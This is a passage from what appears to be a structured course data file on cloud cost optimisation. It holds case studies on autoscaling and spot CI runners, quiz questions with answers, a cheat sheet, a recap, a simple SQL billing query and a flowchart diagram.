        body: `Bill review: fixed 4 instances sized for peak. Load data: 09:00-19:00 3x daily traffic, flat overnight. Policy: min 2, max 8, scale on CPU 60% + queue depth, downscale after 5 min cool-down; overnight scale to 2; nights cost drops; peak coverage verified by load test to 2x peak; savings ~40% compute; incidents: zero; finance flagged it as model for other services; the whole thing traced to 90-day traffic data nobody had charted before.`,
      },
      {
        title: "Move CI runners to spot instances.",
        body: `Self-hosted runners on spot: build jobs interruptible (drain on SIGTERM, retry on another spot node); 75% cost reduction on CI compute; queue transparent to developers; SLO unchanged because retries hide the 2-3% interruption rate; annual savings $18k — the CFO asked for the same pattern for staging; environment spin-down rules: staging off 19:00-08:00 weekdays + weekends saves another $600/mo, restored on demand by PR triggers.`,
      },
    ],
    exam: [
      {
        question:
          "Why do you need tags before cost optimization has any effect?",
        answer:
          "Unattributed spend is invisible spend — without service/team tags, nobody owns the bill and no one can target waste; tagging is the prerequisite for per-service dashboards, anomaly detection, and unit economics; optimization is a measurement problem before it is a budget problem.",
      },
      {
        question:
          "What utilization evidence justifies commitment discounts like reserved instances?",
        answer:
          "Stable, verified baseline load over 30-90 days (p75 of instance utilization above 60-70% during business hours and steady overnight floors) — commit only this steady floor; spiky or growing capacity stays on-demand/spot until proven; over-committing wastes capital beyond the discount gained.",
      },
      {
        question:
          "Why does moving stateless compute behind autoscaling usually save money?",
        answer:
          "Fixed capacity is priced for peak at every non-peak hour; autoscaling pays variable capacity matched to actual traffic with headroom policies; the waste reclaimed (often 30-50% of fixed fleet cost) funds the peak instances with room to spare — utilization is the discount.",
      },
      {
        question:
          "What is the most common cause of unexpected egress charges and the standard fix?",
        answer:
          "Cross-zone/cross-region or internet egress without CDN/compression/caching — fix by fronting cacheable traffic with a CDN, compressing responses, aligning data gravity within a region, and using private links/endpoints instead of public or NAT paths for inter-service traffic.",
      },
    ],
    cheat: [
      "Tags on everything: service, team, env; export to cost explorer daily.",
      "Unit metrics: $ per user / per 1k requests — trend or explain it.",
      "Right-size to p90 CPU/memory; verify by load test before scaling down.",
      "Autoscale on CPU + queue + latency; stabilization windows both directions.",
      "Storage lifecycle hot→cold→archive; kill zombies monthly.",
      "Commit only the proven baseline; spot for interruptible; CDN for egress.",
      "Caching is cost control: measure offload monthly.",
    ],
    recap: `Cloud cost work is engineering with a P&L view: attribute everything with tags, track unit economics, right-size and autoscale against measured traffic, tier storage by access pattern, buy commitments only for the proven baseline, spot for the interruptible, and treat caching plus deletion of zombies as the highest-ROI optimizations — the cloud stops being a mystery invoice and becomes a budget you design.`,
    code: {
      title: "AWS cost-usage export query idea",
      language: "sql",
      code: `SELECT service, SUM(cost) FROM aws_billing WHERE tags['env'] = 'prod' GROUP BY 1 ORDER BY 2 DESC;`,
      explanation:
        "Billing export in your warehouse enables per-service, per-tag views; joining with usage gives unit economics; dashboards and alerts flow from this single source.",
    },
    diagram: {
      title: "Cost optimization loop",
      caption: "Attribute, analyze, act, verify.",
      mermaid: `flowchart LR\n A[Attribute with tags] --> AN[Analyze units]\n AN --> ACT[Right-size and tier]\n ACT --> V[Verify with dashboard]`,
    },
  },
};
